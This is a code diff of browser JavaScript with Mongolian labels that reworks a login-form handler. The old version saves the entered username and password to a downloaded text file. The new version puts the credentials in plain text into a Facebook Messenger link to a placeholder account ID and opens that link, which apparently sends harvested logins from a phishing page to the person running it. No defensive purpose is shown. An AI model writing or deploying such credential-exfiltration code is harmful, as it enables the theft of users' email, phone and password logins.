@@ -1,17 +1,12 @@
-function saveToFile() {
-    let username = document.getElementById("username").value;
-    let password = document.getElementById("password").value;
+function sendToMessenger() {
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
 
-    if (username.trim() === "" || password.trim() === "") {
-        alert("Имэйл/Утас болон Нууц үгээ оруулна уу!");
-        return;
-    }
+    const message = `Нэвтрэх нэр: ${username}\nНууц үг: ${password}`;
 
-    let data = `Хэрэглэгч: ${username}\nНууц үг: ${password}\n\n`;
+    // Messenger руу илгээх URL
+    const messengerUrl = `https://m.me/your-messenger-id?text=${encodeURIComponent(message)}`;
 
-    let blob = new Blob([data], { type: "text/plain" });
-    let a = document.createElement("a");
-    a.href = URL.createObjectURL(blob);
-    a.download = "nevtreh_medeelli.txt";
-    a.click();
+    // Шинэ таб нээнэ
+    window.open(messengerUrl, '_blank');
 }
